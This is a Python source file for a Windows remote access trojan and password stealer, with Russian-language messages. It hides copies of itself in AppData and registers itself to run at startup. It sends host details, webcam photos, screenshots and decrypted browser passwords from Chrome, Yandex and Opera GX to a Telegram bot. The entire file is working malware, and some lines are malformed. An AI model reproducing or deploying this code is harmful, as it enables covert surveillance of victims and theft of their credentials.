import json
import socket
import platform
import os
import psutil
import time
import requests
import sys
import winreg as reg
import shutil
from datetime import datetime
import random
import telebot
import pyautogui
import base64
import sqlite3
import zipfile
from Crypto.Cipher import AES
import cv2
import win32crypt


date_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
system_info = platform.system()
username = os.getlogin()
ip_addresses = socket.gethostbyname_ex(hostname)
cpu_usage = psutil.cpu_percent(interval=1)
memory_usage = psutil.virtual_memory().percent
timezone = time.tzname

script_path = sys.argv[0]

python_path = sys.executable

geo_response = requests.get(f'https://ipinfo.io/{ip_address}/json')
geo_info = geo_response.json()


if getattr(sys, 'frozen', False):
    config_path = os.path.join(sys._MEIPASS, 'config.hex')
else:
    config_path = 'config.hex'

# Чтение файла config.hex
with open(config_path, 'r', encoding='utf-8') as file:
    config_data = json.load(file)

TOKEN = config_data.get('botToken')
USER_ID = config_data.get('chatId')

auto_tasks = config_data.get('autoTasks', {})

autoRun = config_data.get('autoRun', {})

script_path = sys.argv[0]
python_path = sys.executable

def copy_self_to_random_appdata_folder():
    src_file = os.path.realpath(sys.argv[0])

    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')

    base_dir = random.choice([appdata, localappdata])

    subdirs = []
    for root, dirs, _ in os.walk(base_dir):
        for d in dirs:
            full_path = os.path.join(root, d)
            if os.path.isdir(full_path):
                subdirs.append(full_path)

    if not subdirs:
        return

    target_dir = random.choice(subdirs)

    try:
        shutil.copy(src_file, target_dir)
    except Exception as e:
        print()

def add_to_autorun():
    try:
        reg_key = reg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with reg.OpenKey(reg_key, reg_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, f"{autoRun}", 0, reg.REG_SZ, f'"{python_path}" "{script_path}"')

add_to_autorun()
copy_self_to_random_appdata_folder()

bot = telebot.TeleBot(TOKEN)

bot_message = config_data.get('botMessage')

formatted_message = bot_message.replace("{date_time}", date_time) \
                                .replace("{hostname}", hostname) \
                                .replace("{ip_address}", ip_address) \
                                .replace("{system_info}", system_info) \
                                .replace("{username}", username) \
                                .replace("{ip_addresses}", str(ip_addresses)) \
                                .replace("{cpu_usage}", str(cpu_usage)) \
                                .replace("{memory_usage}", str(memory_usage)) \
                                .replace("{timezone}", str(timezone)) \
                                .replace("{geo_info}", str(geo_info))

bot.send_message(USER_ID, f"{formatted_message}\n/help - для получения команд\nby vsenikizanyati")


def get_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key_with_header = base64.b64decode(encrypted_key_b64)
    encrypted_key = encrypted_key_with_header[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        if buff[:3] == b'v10':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        else:
            decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
            return decrypted_pass.decode()
    except Exception:
        return ""

def extract_passwords(login_db_path, master_key):
    passwords = []
    if not os.path.exists(login_db_path):
        return passwords
    try:
        shutil.copy2(login_db_path, "temp_login_db.db")
        conn = sqlite3.connect("temp_login_db.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            password = decrypt_password(encrypted_password, master_key)
            if username or password:
                passwords.append((url, username, password))
        cursor.close()
        conn.close()
        os.remove("temp_login_db.db")
    except Exception as e:
        print()
    return passwords

def save_passwords_to_file(all_passwords):
    with open("passwords.txt", "w", encoding="utf-8") as f:
        for browser_name in all_passwords:
            f.write(f"=== Пароли из {browser_name} ===\n\n")
            for url, user, pwd in all_passwords[browser_name]:
                f.write(f"URL: {url}\nUser: {user}\nPassword: {pwd}\n{'-'*50}\n")
            f.write("\n\n")

def send_file_to_telegram(file_path):
    with open(file_path, "rb") as doc:
        bot.send_document(USER_ID, doc)

if auto_tasks.get('webcam', True):
    temp_dir = "temp"
    os.makedirs(temp_dir, exist_ok=True)
    path = os.path.join(temp_dir, f"webcam_{int(time.time())}.png")

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        bot.send_message(USER_ID, "Не удалось открыть веб-камеру.")

    ret, frame = cap.read()
    cap.release()
    if not ret:
        bot.send_message(USER_ID, "Не удалось получить кадр с веб-камеры.")

    cv2.imwrite(path, frame)
    with open(path, 'rb') as f:
        bot.send_photo(USER_ID, f)
    os.remove(path)
else:
    print()

if auto_tasks.get('screenshot', True):
    temp_dir = "temp"
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    file_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")

    try:
        screenshot_image = pyautogui.screenshot()
        screenshot_image.save(file_path)

        with open(file_path, 'rb') as photo:
            bot.send_photo(USER_ID, photo)
    
    except Exception as e:
        bot.send_message(USER_ID, f"Ошибка при создании скриншота: {e}")
    
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)
else:
    print()

if auto_tasks.get('stiller', True):
    all_passwords = {}
    chrome_local_state = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
    chrome_login_db = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Login Data")
    chrome_master_key = get_master_key(chrome_local_state)
    if chrome_master_key:
        chrome_passwords = extract_passwords(chrome_login_db, chrome_master_key)
        all_passwords["Google Chrome"] = chrome_passwords
    yandex_local_state = os.path.join(os.environ['LOCALAPPDATA'], r"Yandex\YandexBrowser\User Data\Local State")
    yandex_login_db = os.path.join(os.environ['LOCALAPPDATA'], r"Yandex\YandexBrowser\User Data\Default\Login Data")
    yandex_master_key = get_master_key(yandex_local_state)
    if yandex_master_key:
        yandex_passwords = extract_passwords(yandex_login_db, yandex_master_key)
        all_passwords["Yandex Browser"] = yandex_passwords
    opera_local_state = os.path.join(os.environ['APPDATA'], r"Opera Software\Opera GX Stable\Local State")
    opera_login_db = os.path.join(os.environ['APPDATA'], r"Opera Software\Opera GX Stable\Login Data")
    opera_master_key = get_master_key(opera_local_state)
    if opera_master_key:
        opera_passwords = extract_passwords(opera_login_db, opera_master_key)
        all_passwords["Opera GX"] = opera_passwords
    if not all_passwords:
    save_passwords_to_file(all_passwords)
    archive_name = "passwords_archive.zip"
    with zipfile.ZipFile(archive_name, "w", zipfile.ZIP_DEFLATED) as zipf:
        zipf.write("passwords.txt")
    send_file_to_telegram(archive_name)
    os.remove("passwords.txt")
    os.remove(archive_name)
else:
    print()